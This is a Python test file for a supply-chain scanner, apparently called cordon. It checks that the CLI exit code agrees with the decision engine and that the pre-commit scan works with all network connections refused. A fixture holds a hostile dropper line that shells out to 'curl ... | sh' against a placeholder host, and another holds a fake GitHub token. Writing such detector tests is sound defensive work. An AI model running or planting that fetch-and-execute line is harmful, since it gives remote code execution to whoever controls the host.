"""The command line decides what `decide()` decides, and the pre-commit scan needs no network.

`cordon scan` reaches its exit code through the failure policy; `decide()` reaches a state from the same findings under the same policy written as a table. For each fixture package the command's exit
code is clean exactly when the decision is not a block. The pre-commit hook's own command (`scan --staged --fail-on critical --quiet`) is run in a throwaway repository with every connection refused: it
makes none, and still stops a staged hostile file.
"""

from __future__ import annotations

import json
import socket
import subprocess
from datetime import UTC, date, datetime
from pathlib import Path

import pytest

from cordon_scanner import Scanner
from cordon_scanner.cli.main import CommandLine
from cordon_scanner.decide.decision.decider import Decider
from cordon_scanner.decide.decision.evidence import ArtifactRef, Context
from cordon_scanner.decide.decision.legacy import LegacyBridge
from cordon_scanner.foundation.config.settings import Config

TODAY = date(2026, 11, 23)
HOSTILE = "const cp = require('child_process');\ncp.exec('curl -s https://h.invalid/x | sh');\n"
TOKEN = "const t = '" + "ghp_" + "a1B2" * 9 + "';\n"
FIXTURES = {
    "clean": "module.exports = (a, b) => a + b;\n",
    "a dropper": HOSTILE,
    "a leaked token": TOKEN,
}


class Fixture:
    @staticmethod
    def package(root: Path, body: str) -> Path:
        root.mkdir(parents=True, exist_ok=True)
        (root / "package.json").write_text(
            json.dumps({"name": "fx", "version": "1.0.0", "main": "index.js"}), encoding="utf-8"
        )
        (root / "index.js").write_text(body, encoding="utf-8")
        return root

    @staticmethod
    def decision(root: Path) -> object:
        config = Config.default().with_overrides(use_cache=False, offline=True)
        result = Scanner(config).scan(root)
        clock = datetime(TODAY.year, TODAY.month, TODAY.day, 12, tzinfo=UTC)
        table, evidence = (
            LegacyBridge.compiled(config.policy),
            LegacyBridge.evidence(result, config.policy, TODAY),
        )
        return Decider.decide(
            ArtifactRef("package", "pkg:npm/legacy"), Context("cli", "dev"), table, evidence, clock
        )


class Refused:
    """Every connection refused, and a count of the attempts."""

    def __init__(self, monkeypatch: pytest.MonkeyPatch) -> None:
        self.attempts: list[object] = []

        def refuse(*args: object, **kwargs: object) -> None:
            self.attempts.append(args[1:] if args else kwargs)
            raise OSError("the network is blocked")

        monkeypatch.setattr(socket.socket, "connect", refuse)
        monkeypatch.setattr(socket, "getaddrinfo", refuse)


class TestTheCommandDecidesLikeDecide:
    @pytest.mark.parametrize("name", list(FIXTURES))
    def test_the_exit_code_is_clean_exactly_when_the_decision_is_not_a_block(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, name: str
    ) -> None:
        root = Fixture.package(tmp_path / "pkg", FIXTURES[name])
        monkeypatch.chdir(tmp_path)
        code = CommandLine.main(["scan", str(root), "--offline", "--no-color", "--quiet"])
        decision = Fixture.decision(root)
        assert (code == 0) == (not decision.blocked), (name, code, decision.state)  # type: ignore[attr-defined]

    def test_the_fixtures_include_both_outcomes(self, tmp_path: Path) -> None:
        states = {
            name: Fixture.decision(Fixture.package(tmp_path / name.replace(" ", "-"), body)).blocked
            for name, body in FIXTURES.items()
        }  # type: ignore[attr-defined]
        assert True in states.values() and False in states.values(), states


class TestPreCommitNeedsNoNetwork:
    @staticmethod
    def repo(root: Path, body: str) -> None:
        root.mkdir(parents=True, exist_ok=True)
        for args in (
            ["init", "-q"],
            ["config", "user.email", "t@example.invalid"],
            ["config", "user.name", "t"],
        ):
            subprocess.run(["git", *args], cwd=root, check=True)
        (root / "index.js").write_text(body, encoding="utf-8")
        subprocess.run(["git", "add", "index.js"], cwd=root, check=True)

    def run(self, root: Path, monkeypatch: pytest.MonkeyPatch) -> tuple[int, list[object]]:
        refused = Refused(monkeypatch)
        monkeypatch.chdir(root)
        code = CommandLine.main(
            ["scan", "--staged", "--fail-on", "critical", "--quiet", "--no-color"]
        )
        return code, refused.attempts

    def test_a_clean_staged_file_passes_with_no_connection(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self.repo(tmp_path / "r", FIXTURES["clean"])
        code, attempts = self.run(tmp_path / "r", monkeypatch)
        assert code == 0 and attempts == []

    def test_a_staged_token_is_stopped_with_no_connection(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self.repo(tmp_path / "r", TOKEN)
        code, attempts = self.run(tmp_path / "r", monkeypatch)
        assert code != 0 and attempts == []

    def test_the_command_run_here_is_the_hooks_own_entry(self) -> None:
        from support import ROOT

        text = (ROOT / ".pre-commit-hooks.yaml").read_text(encoding="utf-8")
        assert "entry: cordon-scanner scan --staged --fail-on critical --quiet" in text
